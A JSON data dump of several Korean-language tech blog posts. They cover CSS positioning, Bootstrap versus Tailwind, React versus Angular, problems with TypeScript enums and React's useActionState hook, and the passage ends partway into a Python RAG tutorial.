{"pageProps":{"posts":[{"title":"CSS Position  Absolute와 Relative 비교 올바르게 사용하는 방법","description":"","date":"2024-06-30 18:37","slug":"2024-06-30-CSSPositionAbsoluteRelative","content":"\n\n# 위치: 상대적(relative);\n\n요소가 상대적으로 위치할 때는 문서 흐름에서의 정상적인 위치를 기준으로 배치됩니다. 주변 요소에 영향을 미치지 않으며 문서 흐름 상에서의 위치를 유지합니다.\n\n```js\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>상대적 위치 설정 예시</title>\n    <style>\n        .relative-box {\n            width: 200px;\n            height: 100px;\n            background-color: lightblue;\n            position: relative;\n            top: 20px;\n            left: 30px;\n        }\n        .text {\n            background-color: lightgreen;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"relative-box\">\n        상대적으로 위치한 상자입니다.\n    </div>\n    <div class=\"text\">\n        상자 아래에 있는 일부 텍스트입니다.\n    </div>\n</body>\n</html>\n```\n\n# 위치: 절대적(absolute);\n\n<div class=\"content-ad\"></div>\n\n절대 위치로 요소를 배치하면 이 요소는 가장 가까운 위치 지정된 조상에 대해 배치됩니다 (즉, 정적이 아닌 위치를 가진 가장 가까운 조상). 이러한 조상이 없는 경우 초기 포함 블록에 대해 배치됩니다 (일반적으로 뷰포트).\n\n```js\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>절대 위치 지정 예시</title>\n    <style>\n        .relative-container {\n            position: relative;\n            width: 300px;\n            height: 200px;\n            background-color: lightgray;\n        }\n        .absolute-box {\n            position: absolute;\n            top: 20px;\n            right: 30px;\n            width: 100px;\n            height: 50px;\n            background-color: lightcoral;\n        }\n        .text {\n            background-color: lightgreen;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"relative-container\">\n        <div class=\"absolute-box\">\n            저는 절대 위치로 배치된 상자입니다.\n        </div>\n        컨테이너\n    </div>\n    <div class=\"text\">\n        컨테이너 아래의 텍스트입니다.\n    </div>\n</body>\n</html>\n```\n\n또는\n\n```js\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>상대 및 절대 위치 지정 예시</title>\n    <style>\n        .outer-container {\n            width: 400px;\n            height: 300px;\n            background-color: lightgray;\n            position: relative;\n            margin-bottom: 20px;\n        }\n\n        .inner-container {\n            width: 300px;\n            height: 200px;\n            background-color: lightblue;\n            position: relative;\n            top: 20px;  /* inner-container의 위치에서 아래로 20px 이동 */\n            left: 20px; /* inner-container의 위치에서 오른쪽으로 20px 이동 */\n        }\n\n        .absolute-box {\n            width: 100px;\n            height: 50px;\n            background-color: lightcoral;\n            position: absolute;\n            bottom: 10px; /* 상자를 inner-container의 하단에서 10px로 배치 */\n            left: 10px;   /* 상자를 inner-container의 왼쪽에서 10px로 배치 */\n        }\n\n        .text {\n            background-color: lightgreen;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"outer-container\">\n        <div class=\"inner-container\">\n            <div class=\"absolute-box\">\n                저는 절대 위치로 배치된 상자입니다.\n            </div>\n            저는 상대적 위치로 배치된 내부 컨테이너입니다.\n        </div>\n        저는 상대적 위치로 배치된 외부 컨테이너입니다.\n    </div>\n    <div class=\"text\">\n        외부 컨테이너 아래의 텍스트입니다.\n    </div>\n</body>\n</html>\n```\n\n<div class=\"content-ad\"></div>\n\n# 읽어 주셔서 감사합니다\n\n- 장기 멘토십을 위해 Preplaced.com에서 연락하세요,\n\n무료 체험 신청하세요! — https://www.preplaced.in/profile/sonika-maheshwari\n\n📰 코딩 및 디자인 라운드 인터뷰에 대한 더 많은 콘텐츠 보기 - https://sonikamaheshwari067.medium.com/\n\n<div class=\"content-ad\"></div>\n\n🔔 Follow me on LinkedIn! — [https://www.linkedin.com/in/sonika-maheshwari-81542220/](https://www.linkedin.com/in/sonika-maheshwari-81542220/)\n\n저는 항상 개선할 부분이 있을 것이라고 믿어요. 의견을 자유롭게 공유해주세요.","ogImage":{"url":"/assets/img/2024-06-30-CSSPositionAbsoluteRelative_0.png"},"coverImage":"/assets/img/2024-06-30-CSSPositionAbsoluteRelative_0.png","tag":["Tech"],"readingTime":4},{"title":"2024년에 Bootstrap과 Tailwind 비교 어떤 CSS 프레임워크가 더 나은가","description":"","date":"2024-06-30 18:36","slug":"2024-06-30-BootstrapvsTailwindAComparisonofCSSFrameworks","content":"\n\n![img](/assets/img/2024-06-30-BootstrapvsTailwindAComparisonofCSSFrameworks_0.png)\n\n안녕하세요, 개발자 여러분! CSS 프레임워크에 관한 많은 이야기가 있지만, 여기에 제 의견을 덧붙이겠습니다.\n\n두 프레임워크는 각자의 장점과 약점을 가지고 있고, 이 글에서는 자세히 살펴보며 여러분이 필요에 맞는 것을 선택하는 데 도움이 될 것입니다. 게다가, HNG에서 React로 작업하며 기대하는 것과 인턴십 중에 이루고 싶은 목표에 대해 나누도록 하겠습니다.\n\n부트스트랩:\n부트스트랩은 포괄적인 미리 디자인된 UI 구성 요소, 레이아웃 및 유틸리티를 제공하는 인기 있는 CSS 프레임워크입니다. 12열 그리드 시스템을 사용하며 다양한 사용자 정의 옵션을 제공합니다. 부트스트랩은 큰 커뮤니티와 방대한 문서를 가지고 있어 빠른 프로토타이핑과 개발에 좋은 선택입니다.\n\n<div class=\"content-ad\"></div>\n\n테일윈드:\n테일윈드는 유틸리티 중심의 CSS 프레임워크로, 스타일링에 독특한 접근 방식을 제공합니다. 구성 중심의 접근 방식을 사용하며 HTML 요소에 스타일링할 수 있는 다양한 유틸리티 클래스를 제공합니다. 테일윈드는 맞춤화에 강조를 두며 맞춤 UI 컴포넌트를 구축하기 위한 강력한 도구 세트를 제공합니다.\n\n비교:\n부트스트랩과 테일윈드는 각각의 장점을 가지고 있습니다. 부트스트랩은 미리 디자인된 UI 컴포넌트와 광범위한 커뮤니티 지원에 뛰어납니다. 한편, 테일윈드는 유틸리티 중심의 접근 방식과 맞춤화 옵션에서 빛을 발합니다. 부트스트랩은 포괄적인 UI 컴포넌트 세트로 빠른 프로토타이핑에 이상적이지만, 테일윈드의 유틸리티 클래스는 맞춤 UI 개발에 적합합니다.\n\n맞춤화:\n맞춤화에 있어서는 테일윈드가 선도합니다. 구성 중심의 접근 방식을 통해 확장 가능한 맞춤화 옵션을 제공하여 프로젝트에 독특한 룩 앤 필을 쉽게 만들 수 있습니다. 다른 한편으로, 부트스트랩은 일부 맞춤화 옵션을 제공하지만 테일윈드와 비교하면 제약이 있습니다.\n\n커뮤니티 지원:\n부트스트랩은 더 큰 커뮤니티와 더 많은 문서를 가지고 있어 필요할 때 리소스와 지원을 쉽게 찾을 수 있습니다. 테일윈드의 커뮤니티는 작지만 여전히 활발하고 지원적입니다.\n\n<div class=\"content-ad\"></div>\n\n성능:\n두 프레임워크 모두 성능이 우수하지만 Tailwind의 유틸리티 중심 접근 방식은 CSS 파일 크기와 로드 시간 측면에서 더 효율적입니다.\n\n이제 HNG로...!\n\n![이미지](/assets/img/2024-06-30-BootstrapvsTailwindAComparisonofCSSFrameworks_1.png)\n\nHNG 인턴십 소개:\nHNG의 인턴십 프로그램은 React를 사용한 프런트엔드 개발을 실무 경험을 제공하도록 디자인되었습니다. 이 프로그램은 포괄적인 커리큘럼, 멘토십, 그리고 인턴들이 스킬을 향상시킬 수 있도록 현실적인 프로젝트를 제공합니다. (HNG의 인턴십 프로그램에 대해 더 알아보려면 [여기](https://hng.tech/internship)를 방문하세요). 게다가, HNG는 인턴들이 전문 포트폴리오를 구축하고 잠재적인 고용주들과 연결할 수 있도록 프레미엄 서비스를 제공합니다. (HNG의 프리미엄 서비스를 탐색하려면 [여기](https://hng.tech/premium)에서 확인하세요).\n\n<div class=\"content-ad\"></div>\n\n리액트 — 프론트엔드 개발을 위한 프레임워크:\n리액트는 사용자 인터페이스를 구축하기 위한 인기 있는 JavaScript 라이브러리입니다. 컴포넌트 기반 접근 방식, 가상 DOM 및 효율적인 업데이트 메커니즘을 제공하여 프론트엔드 개발을 위한 최고의 선택지가 되고 있습니다. 인턴십 중에는 빠르고 확장 가능하며 유지 보수가 용이한 애플리케이션을 만들기 위해 리액트를 사용할 예정입니다.\n\n나의 기대:\n리액트를 통해 실무 경험을 쌓고, 경험 많은 멘토로부터 배우며, 도전적인 프로젝트에 참여할 것을 기대합니다. 프론트엔드 커뮤니티에 기여하고 나의 기술을 쇼케이스하는 전문 포트폴리오를 개발하는 것에 흥미를 느낍니다.\n\n결론:\n종합하면, 부트스트랩과 테일윈드는 각각 독특한 장점을 가진 강력한 CSS 프레임워크입니다. 이들의 차이를 이해함으로써 개발자들은 프로젝트에 가장 적합한 도구를 선택할 수 있습니다. HNG 여정을 시작하면서, 리액트의 가능성을 탐험하고 프론트엔드 커뮤니티에 기여하는 것에 기대됩니다.","ogImage":{"url":"/assets/img/2024-06-30-BootstrapvsTailwindAComparisonofCSSFrameworks_0.png"},"coverImage":"/assets/img/2024-06-30-BootstrapvsTailwindAComparisonofCSSFrameworks_0.png","tag":["Tech"],"readingTime":3},{"title":"React vs Angular 최고의 선택을 위한 대결 분석","description":"","date":"2024-06-30 18:35","slug":"2024-06-30-ReactvsAngularPickingTheGiantForTheBestUse","content":"\n\n## 목차\n\n- 첫인상\n- React 및 그 기능들\n- Angular 및 그 기능들\n- React와 Angular 비교\n- React와 Angular의 장점\n- React와 Angular의 단점\n- 최적의 사용 사례\n- 최종 생각\n\nReact와 Angular는 웹 애플리케이션의 프론트엔드를 구축하는 데 사용되는 매우 인기있는 기술입니다. React는 학습의 용이성, 높은 채택률 및 방대한 생태계로 잘 알려져 있으며, Angular는 코드 구조의 견고함으로 높은 수준의 응용프로그램에 가장 적합한 옵션으로 알려져 있습니다. 이 기사에서는 이 두 거인, 그들의 차이점, 강점 및 약점을 살펴보고 가장 유용한 분야를 알아보겠습니다.\n\n# React\n\n<div class=\"content-ad\"></div>\n\nReact은 사용자 인터페이스를 만드는 데 중점을 둔 JavaScript 라이브러리로서, Meta(이전 Facebook)에서 구축 및 유지보수되며 재사용 가능한 컴포넌트와 선언적 프로그래밍 패러다임을 활용합니다. React는 가상 DOM을 사용하여 웹 페이지의 메모리에 대한 표현을 제공하여 웹 애플리케이션이 UI 변경을 쉽게 수행할 수 있도록 합니다.\n\n컴포넌트 기반 아키텍처와 가상 DOM의 사용으로, React를 사용하면 웹 애플리케이션의 다음 동작을 예측하기가 쉬워지며, 개발자 커뮤니티가 크기 때문에 새로운 개발자들도 쉽게 학습할 수 있습니다.\n\n## 특징\n\n- 컴포넌트 기반 아키텍처와 선언적 프로그래밍에 중점을 두기 때문에 웹에서 사용자 인터페이스를 쉽게 구축하고 전체 코드 결과를 예측할 수 있습니다.\n- JSX(JavaScript XML)의 사용으로 HTML과 JavaScript의 능력을 결합하여 단일 페이지 애플리케이션(SPA)을 효과적으로 구축할 수 있습니다.\n- 상태(state), 속성(props), 훅(hooks)을 활용하여 애플리케이션의 동적 데이터를 처리할 수 있습니다.\n- 가상 DOM을 통해 웹 애플리케이션을 효과적이고 효율적으로 렌더링할 수 있습니다.\n- 큰 커뮤니티는 특정 작업을 위한 라이브러리 및 React를 기반으로 한 프레임워크를 만들어 다양성을 촉진하므로 개발자 경험을 즐겁게 만듭니다.\n\n<div class=\"content-ad\"></div>\n\n# Angular\n\nAngular은 Google에서 만들고 유지보수하는 JavaScript 프레임워크로, 강력하고 복잡한 웹 애플리케이션을 개발하는 데 사용됩니다. TypeScript를 사용하며, TypeScript는 JavaScript의 슈퍼셋으로, 타입 체크와 같은 기능을 추가하여 코드를 구성하고 유지보수를 쉽게 할 수 있도록 합니다. 전반적으로, Angular는 사용자가 웹에서 데스크톱 앱을 사용하는 경험을 할 수 있도록 도와줍니다.\n\n## 특징\n\n- 추가 라이브러리를 설치하거나 가져오지 않아도 애플리케이션을 개발할 수 있는 풍부한 기능 세트를 제공합니다.\n- TypeScript를 사용하여 코드를 더 깔끔하고 타입 체크를 통해 버그 발생 가능성을 줄입니다.\n- 컴포넌트 구조로 인해 매우 높은 캡슐화 수준을 갖습니다.\n- 서비스와 의존성 주입을 사용하여 컴포넌트 간에 데이터를 공유할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# 장점\n\n## React\n\n- 커뮤니티가 크기 때문에 라이브러리와 프레임워크를 만들어 패키지로 제공하여 개발자가 새로운 멋진 기능을 추가할 수 있습니다.\n- JSX 사용으로 브라우저에 표시될 내용을 프로그래밍 방식으로 결정하는 것이 쉬워집니다.\n- 가상 DOM을 통해 UI를 브라우저에 빠르게 렌더링할 수 있습니다.\n- 배우기 쉬운 곡선을 가지고 있어 초보자가 배우기가 쉽습니다.\n\n## Angular\n\n<div class=\"content-ad\"></div>\n\n- TypeScript을 사용하여 코드 구조를 더 견고하게 만들어 버그가 덜 발생하고 유지 관리하기 쉽습니다.\n- 필요한 패키지를 가져오지 않아도 되어 개발자들이 라우팅, 상태 관리 등 특정 작업에 대해 추가 패키지를 사용하지 않아도 됩니다.\n- 서버 측 렌더링을 보다 쉽고 빠르게 만들어 줍니다.\n\n# 단점\n\n## 리액트\n\n- 큰 생태계가 많은 라이브러리와 프레임워크로 인해 개발자들에게 압도적일 수 있습니다, 특히 처음 시작하는 사람들에겐 어려울 수 있습니다.\n- 빠른 개발 속도는 개발자들이 최신 상태를 유지하기 어렵게 만듭니다.\n- 생태계의 특성으로 인해 리액트 응용프로그램을 구축하는 표준 방법이 없어 개발 프로세스에서 복잡성을 야기할 수 있습니다.\n- 부실한 문서로 리액트 라이브러리의 깊은 부분을 이해하기 어렵습니다.\n\n<div class=\"content-ad\"></div>\n\n## Angular\n\n- 초보자에게는 배우기 어려운 러닝 커브가 있어요.\n- 대규모 제품에서 사용되는데 호환성 문제가 있어요.\n- 인터넷 연결이 느릴 때 특히 다운로드하기 어려운 무거운 프레임워크에요.\n\n# 최적의 사용 사례\n\n## React\n\n<div class=\"content-ad\"></div>\n\n- Single Page Applications (SPAs)\n- 대시보드 및 데이터 시각화\n- React Native를 활용한 모바일 앱\n\n## Angular\n\n- 기업 수준의 웹 애플리케이션\n- 동적 콘텐츠를 갖춘 웹페이지\n- Progressive Web Applications (PWAs)\n\n# 마지막으로 생각해볼 내용\n\n<div class=\"content-ad\"></div>\n\n제 프로젝트에서는 다양성과 JSX 사용 때문에 React를 주로 사용합니다. JSX를 사용하면 작업이 더 쉬워지기 때문에 좋습니다.\n\n이 기사는 제가 Medium에서 처음 쓴 기사이자 온라인 블로그에서 쓴 첫 기사입니다. 이 기사는 HNG Tech의 무료 인턴십 프로그램에서 주어진 과제였습니다.\n\n행사에 등록하려면 여기를 클릭하거나 https://hng.tech/internship로 이동하세요.\n\n귀사를 위해 인재를 고용하려면 여기를 클릭하거나 https://hng.tech/hire로 이동하세요.\n\n<div class=\"content-ad\"></div>\n\n이 기사를 즐겁게 읽으셨기를 바랍니다. 궁금한 점이나 생각이 있으시면 댓글란에 달아주세요.\n\n고맙고 즐거운 하루 되세요 😊","ogImage":{"url":"/assets/img/2024-06-30-ReactvsAngularPickingTheGiantForTheBestUse_0.png"},"coverImage":"/assets/img/2024-06-30-ReactvsAngularPickingTheGiantForTheBestUse_0.png","tag":["Tech"],"readingTime":4},{"title":"TypeScript Enum이 정말 별로인 이유 5가지","description":"","date":"2024-06-30 18:34","slug":"2024-06-30-TypeScriptEnumsareTerrible","content":"\n\n\n![TypeScript Enums](/assets/img/2024-06-30-TypeScriptEnumsareTerrible_0.png)\n\n## Enum의 역사\n\nTypeScript는 2012년에 등장하여 컴파일 시간에 타입을 확인하는 새로운 시대를 연 했습니다.\n\nTypeScript는 JavaScript의 하위 집합이므로 개발자들이 구현하기 쉬웠으며, 코드는 마침내 JavaScript로 컴파일되었습니다.\n\n\n<div class=\"content-ad\"></div>\n\nTypeScript에는 클래스와 같은 새로운 기능이 도입되었습니다. 이 기능은 2015년 JavaScript에 도입되었습니다.\n\n또한 TypeScript에 추가된 열거형(enum)이라는 또 다른 기능이 있는데, 이 기능은 아직 JavaScript에 구현되지 않았습니다.\n\n이것이 JavaScript에 왜 아직 구현되지 않았는지 궁금해지는 이유입니다.\n\n# 열거형(enum)이란 무엇을 하는 것인가요?\n\n<div class=\"content-ad\"></div>\n\n열거형은 사용할 때 반드시 원본 개체를 참조해야하는 값을 정의하는 방법입니다.\n\n```js\nenum Direction {\n  Up,\n  Down,\n  Left,\n  Right,\n}\n\nconst move = (direction: Direction) => {};\n\nmove(Direction.Up);\nmove(Direction.Down);\n```\n\n우리는 이들이 어떻게 작동하는지 배워보고, 어쩌면 왜 클래스처럼 JavaScript에 아직 추가되지 않았는지 알아봅시다.\n\n# TypeScript의 열거형은 어떻게 작동하나요?\n\n<div class=\"content-ad\"></div>\n\n이전 예제를 가져와서 변환된 JavaScript 코드를 살펴보겠습니다.\n\n열거형은 실행 중에 약간 예측할 수 없는 동작을 합니다.\n\n다음과 같이 Direction 열거형이 있다고 가정해 봅시다.\n\n```js\nenum Direction {\n  Up,\n  Down,\n}\n```\n\n<div class=\"content-ad\"></div>\n\n기본적으로 Up의 값은 0이 되고 Down은 1이 됩니다. 자연스레 모두가 이 enum이 객체처럼 끝날 것이라고 생각할 것입니다.\n\n```js\nconst Direction = {\n  Up: 0,\n  Down: 1,\n}\n```\n\n그러나 JavaScript의 변환 코드를 살펴보면, 우리가 예상한 것과 약간 다른 복잡하고 심상치 않은 코드를 발견할 수 있습니다.\n\n```js\n\"use strict\";\nvar Direction;\n(function (Direction) {\n    Direction[Direction[\"Up\"] = 0] = \"Up\";\n    Direction[Direction[\"Down\"] = 1] = \"Down\";\n})(Direction || (Direction = {}));\n```\n\n<div class=\"content-ad\"></div>\n\n요런 객체가 나올 거에요. 예상했던 것과 매우 다르죠.\n\n```javascript\nconst Direction = {\n  Up: 0,\n  0: 'Up',\n  Down: 1,\n  1: 'Down'\n}\n```\n\n만약 Object.values(Direction)을 실행하면 [\"Up, \"Down\", 0, 1]과 같은 결과를 얻게 됩니다. 이것은 예상치 못한 결과이며 제대로 된 객체가 아닙니다.\n\n이것이 enum에 대해 짜증나는 첫 번째 점입니다. 기대에 맞게 동작하지 않는다는 것이죠.\n\n<div class=\"content-ad\"></div>\n\n문자열 열거형의 경우에는 적절한 객체가 생성됩니다.\n\n```js\nenum Direction  {\n  UP = \"Up\",\n  DOWN = \"Down\",\n}\n\n// 변환된 코드 \n\n\"use strict\";\nvar Direction;\n(function (Direction) {\n    Direction[\"UP\"] = \"Up\";\n    Direction[\"DOWN\"] = \"Down\";\n})(Direction || (Direction = {}));\n\n// 적절한 JS 객체 \n\nconst Direction = {\n  \"UP\": \"Up\",\n  \"DOWN\": \"DOWN\"\n}\n```\n\n그럼에도 불구하고 이에는 문제가 있습니다. 이를 보여드릴게요.\n\n어떤 함수에서 Direction 열거형 값을 액세스하려고 하는 경우를 가정해 봅시다.\n\n<div class=\"content-ad\"></div>\n\n\n열거형 Direction {\n  UP= \"위\",\n  DOWN = \"아래\",\n}\n\n함수 logDirection(direction: Direction) {\n  콘솔.로그(direction)\n}\n\n✅ 잘 작동합니다\nlogDirection(Direction.UP)\n\n❌ 작동하지 않습니다 - 열거형의 멤버값으로 함수를 호출할 수 없습니다\nlogDirection(\"위\")\n\n\nlogDirection 함수를 Direction의 멤버 값으로 호출할 수 없다는 것을 알 수 있습니다.\nTypeScript를 보면 런타임 값보다는 이름에 신경을 쓴다는 저의 기대대로 동작합니다.\n\nDirection.UP와 Up의 값은 동일하며 이상적으로 TypeScript는 신경 쓰지 않을 것으로 예상되지만 열거형의 경우 이 규칙이 깨집니다.\n\n또한 const 열거형도 있으며 열거형을 사용하고 싶다면 유용할 수 있지만 주의할 점도 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nconst enum Direction  {\n  UP = \"Up\",\n  DOWN = \"Down\",\n}\n\n// transpile code\n\n\"use strict\";\n// nothing\n```\n\n보면 알 수 있듯이 enum을 const로 만드는 즉시, transpile code가 없다는 것은 이 경우 TypeScript에서 처리되며 구현 세부 사항에 대해 끝 사용자를 혼동시키지 않습니다. 멋지죠 😎 하지만 다시 한 번 주의할 점이 있어요.\n\n이를 사용해서 **왜 절대 사용해서는 안 되는지**에 대해 강조한 문서의 별도 섹션이 있습니다.\n\n[여기](https://www.typescriptlang.org/docs/handbook/enums.html#const-enum-pitfalls)를 참조해주세요.\n\n<div class=\"content-ad\"></div>\n\n# 열거형의 혼란을 해결하는 방법\n\n열거형 대신 값을 수정하지 않을 객체와 함께 항상 as const를 사용해야 합니다.\n빠르게 예시를 살펴보겠습니다.\n\n```js\nconst Direction = {\n  UP: \"Up\",\n  DOWN: \"Down\"\n} as const\n\n\ntype GetValues<T> = T[keyof T]\n\ntype UnionOfObjectValues = GetValues<typeof Direction>\n\nfunction logDirection(direction: UnionOfObjectValues) {\n  console.log(direction)\n}\n\n✅ 동작합니다\nlogDirection(Direction.UP)\n\n✅ 또한 동작합니다\nlogDirection(\"Up\")\n```\n\n이 방법은 TypeScript의 기대에 완벽히 부합하며 작동 방식을 이해하기 쉽게 만듭니다.\n\n<div class=\"content-ad\"></div>\n\n만약 더 쉽게 만들고 싶다면, 오브젝트 값 대신 Direction의 키에서 union을 유도할 수 있어요.\n\n```js\nconst Direction = {\n  UP: \"Up\",\n  DOWN: \"Down\"\n} as const\n\ntype Directions = keyof typeof Direction\n\nfunction logDirection(direction: Directions) {\n  console.log(`${Direction[direction]} is present`)\n}\n\n✅ 잘 작동해요\nlogDirection(\"UP\")\n\n✅ 잘 작동해요\nlogDirection(\"DOWN\")\n```\n\nMatt Pocock와 Aaron이 이넘의 최악의 악몽을 설명하는 아주 좋은 비디오가 있어요. 이 비디오가 이 기사를 쓰게 된 동기가 되었죠.\n\n# 결론\n\n<div class=\"content-ad\"></div>\n\n우리는 항상 enum을 사용하는 대신 간단한 객체와 어떤 종류의 매직을 사용해야 합니다. enum은 이해하기 쉽고 어떤 놀라움도 주지 않습니다.\n\nTypeScript는 OOP를 더 중시하기 위해 enum을 도입했지만, 제 생각에 그것은 좋은 결정이 아니었습니다.","ogImage":{"url":"/assets/img/2024-06-30-TypeScriptEnumsareTerrible_0.png"},"coverImage":"/assets/img/2024-06-30-TypeScriptEnumsareTerrible_0.png","tag":["Tech"],"readingTime":5},{"title":"useActionState  React의 새로운 Hook ","description":"","date":"2024-06-30 18:33","slug":"2024-06-30-useActionStateANewHookinReact","content":"\n\n<img src=\"/assets/img/2024-06-30-useActionStateANewHookinReact_0.png\" />\n\n안녕하세요 개발자 여러분 👋, 저는 Md Taqui Imam입니다. 오늘은 React의 새로운 흥미로운 훅인 useActionState에 대해 설명하려고 합니다.\n\n## useActionState란 무엇인가요?\n\nuseActionState는 폼 작업의 결과에 기반하여 상태를 업데이트하는 데 도움을 주는 새로운 React 훅입니다.\n\n<div class=\"content-ad\"></div>\n\n우리를 위해 기억하고 양식을 제출할 때 변경할 수 있는 스마트 도우미 같아요.\n\n공식 문서를 확인해보세요🚀\n\n## useActionState를 사용하는 방법은?\n\n이 훅을 사용하려면 먼저 React에서 가져와야 합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nimport { useActionState } from 'react';\n```\n\n이제, 우리는 컴포넌트에서 다음과 같이 사용할 수 있어요:\n\n```js\nconst [state, formAction] = useActionState(actionFunction, initialState);\n```\n\n여기서 각 부분이 의미하는 바입니다:\n\n<div class=\"content-ad\"></div>\n\n- ‘state’은 현재 양식 상태입니다.\n- ‘formAction’은 양식에서 사용할 새로운 액션입니다.\n- ‘actionFunction’은 양식을 제출할 때 실행되는 함수입니다.\n- ‘initialState’은 상태의 초기값입니다.\n\n## useActionState를 사용하는 시기:\n\n이 훅을 사용하면 서버 구성 요소를 사용하며 더 빠른 응답을 원할 때 포르를 제출하여 상태를 업데이트할 때 사용하세요.\n\n예시:\n\n<div class=\"content-ad\"></div>\n\n간단한 카운터 양식을 useActionState를 사용하여 만들어봅시다:\n\n```js\nimport { useActionState } from \"react\";\n\nasync function increment(previousState, formData) {\n  return previousState + 1;\n}\n\nfunction StatefulForm() {\n  const [state, formAction] = useActionState(increment, 0);\n  return (\n    <form>\n      {state}\n      <button formAction={formAction}>Increment</button>\n    </form>\n  );\n}\n```\n\n이 예시에서 우리가 버튼을 클릭할 때마다 숫자가 하나씩 증가합니다. useActionState 훅이 양식이 제출될 때마다 상태를 업데이트하는 것을 관리해줘요.\n\n## 이게 전부에요 😅\n\n<div class=\"content-ad\"></div>\n\n기억하세요! 배우는 가장 좋은 방법은 경험하는 것입니다.\n\n그래서 useActionState가 보다 널리 사용 가능해지면, 여러분의 프로젝트에서 사용해보세요. 어떻게 양식을 개선할 수 있는지 확인해 보세요!\n\n코딩 즐기세요!\n\n[사진](/assets/img/2024-06-30-useActionStateANewHookinReact_1.png)","ogImage":{"url":"/assets/img/2024-06-30-useActionStateANewHookinReact_0.png"},"coverImage":"/assets/img/2024-06-30-useActionStateANewHookinReact_0.png","tag":["Tech"],"readingTime":2},{"title":"파이썬으로 GenAI 개발하기 최신 LLM과 RAG 완벽 튜토리얼","description":"","date":"2024-06-30 18:30","slug":"2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial","content":"\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_0.png\" />\n\n이 기사에서는 개인 문서에서 지식을 효과적으로 학습하고 질문에 대답할 수 있는 간단한 AI를 구축하는 방법을 보여드리겠습니다.\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_1.png\" />\n\n## 소개\n\n<div class=\"content-ad\"></div>\n\n자연어 처리(NLP)는 기계와 인간 언어 간의 상호작용을 연구하는 인공 지능 분야입니다. 지금까지 NLP의 정점은 거대한 양의 텍스트 데이터로 훈련된 대형 언어 모델(LLM)의 등장이었습니다. LLM은 언어 패턴과 변형을 학습할 수 있는 능력을 갖추고 있습니다. \"언어 모델\"이라는 용어는 딥 러닝과 신경망의 발전과 함께 흔해졌습니다. 특히 2018년 구글이 Transformer 기반 아키텍처를 소개한 후에는 NLP 모델의 성능이 크게 향상되었습니다.(구글의 BERT 및 OpenAI의 GPT).\n\n오늘날 LLM은 일반적으로 텍스트 간 작업 또는 \"텍스트 생성\"(즉, 번역, 요약, 챗봇 및 가상 비서, 심지어 전체 책 작성)에 사용됩니다. 이를 통해 우리는 새로운 콘텐츠(텍스트, 이미지, 오디오, 비디오 등) 작성에 초점을 맞춘 산업 분야인 생성적 인공지능(GenAI)의 부상을 목격하고 있습니다.\n\n최신 LLM 풍경:\n\n- OpenAI의 ChatGPT, 가장 많이 사용됨 (여기서 시도해보기)\n- Anthropic의 Claude(여기서 시도해보기)\n- Google의 Gemini(여기서 시도해보기)\n- Meta의 Llama(여기서 시도해보기)\n- Microsoft의 Phi, 사용 가능한 모델 중 가장 작은 모델로 GPU 없이도 노트북에서 실행 가능(여기서 시도해보기)\n- StabilityAI의 StableLM\n- Cohere의 CommandR(여기서 시도해보기)\n- Snowflake의 Arctic(여기서 시도해보기)\n- Alibaba의 Qwen(여기서 시도해보기)\n- 01AI의 Yi\n- X의 Grok\n- NVIDIA의 Megatron\n- 아마존의 Olympus(아직 출시 예정)\n- Apple의 MM1(아직 출시 예정)\n\n<div class=\"content-ad\"></div>\n\nChatGPT은 가장 일반적으로 사용되는 LLM입니다. 그러나 회사들은 그것으로 업로드하기 어려운 문제가 있습니다. (대부분은 개인 정보 및 보안 상의 이유로) OpenAI에 민감한 데이터를 업로드할 수 없습니다. 따라서 회사들은 비공개 지식베이스에서 LLM의 파워를 활용하기 위해 내부 AI 서비스를 개발하고 있습니다. 이러한 종류의 작업을 검색 증강 생성(RAG)이라고 합니다. 이 기술은 외부 소스에서 가져온 지식 사실을 LLM에 추가하여 검색 및 생성 모델을 결합하는 방법입니다.\n\n조직 내에서, 지식 베이스는 일반적으로 다중 모달 콘텐츠(예: 텍스트, 이미지, 스프레드시트)를 포함한 문서로 구성되어 있으므로, 기계가 이해할 수 있도록 모든 것들을 처리하는 것이 가장 큰 도전입니다. 간단히 말해서, 먼저 모든 문서를 임베딩으로 변환한 다음 사용자 쿼리를 동일한 벡터 공간으로 변환하여 코사인 유사도 검색을 수행합니다.\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_2.png)\n\n이 자습서에서는 GPU 없이 일반 노트북에서 실행 가능한 LLMs 및 다중 모달 데이터를 사용하여 RAG 앱을 만들 것입니다. 다른 유사한 경우에 쉽게 적용할 수 있는 유용한 Python 코드 몇 가지를 제시하고 있으며 (그저 복사하여 붙여넣기하고 실행하면 됩니다), 각 코드 라인에 대한 설명을 포함하여 이 예제를 복제할 수 있도록 안내할 것입니다 (전체 코드에 대한 링크는 아래에 있습니다).\n\n<div class=\"content-ad\"></div>\n\n특히 다음을 살펴볼 것입니다:\n\n- 설정: Pdf2image로 데이터 가져오기, PyTesseract로 OCR 처리하기.\n- 전처리: Ollama를 사용하여 LLM으로 데이터를 보강하기.\n- 데이터베이스: ChromaDB로 데이터를 벡터로 저장하고 쿼리하기.\n- 백엔드: Ollama를 사용하여답변 생성하기.\n- 프론트엔드: Streamlit으로 사용자가 AI와 상호작용할 수 있는 인터페이스 구축하기.\n\n## 설정\n\n현실 세계에서 회사들은 대부분의 문서를 공유하기 전에 해당 형식으로 변환하는 PDF를 광범위하게 사용합니다. 또한 이미지, 테이블, 텍스트가 포함된 문서들이 많이 있어 좋은 사용 사례를 나타냅니다. 따라서 이 예제에서는 PDF 형식의 공개 